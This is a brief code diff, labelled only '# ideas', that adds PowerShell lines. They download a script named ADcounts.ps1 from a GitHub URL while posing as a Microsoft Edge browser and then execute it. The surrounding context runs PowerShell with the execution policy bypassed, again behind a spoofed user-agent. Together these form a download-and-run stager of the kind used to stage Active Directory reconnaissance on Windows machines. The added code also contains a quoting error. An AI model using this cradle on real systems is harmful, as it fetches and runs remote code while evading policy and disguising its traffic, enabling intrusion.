@@ -1,3 +1,10 @@
+# ideas ...
+$ua = ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.45"
+$site = "https://github.com/OnlyTheShadowKnows/AD/blob/master/ADcounts.ps1"
+$dst = "adcounts.ps1"
+invoke-webrequest -uri $site -UserAgent $ua -OutFile $dst
+invoke-expression -command $dst
+
 powershell -exec bypass -command {
     $cli = New-Object System.Net.WebClient;
     $cli.Headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.45"
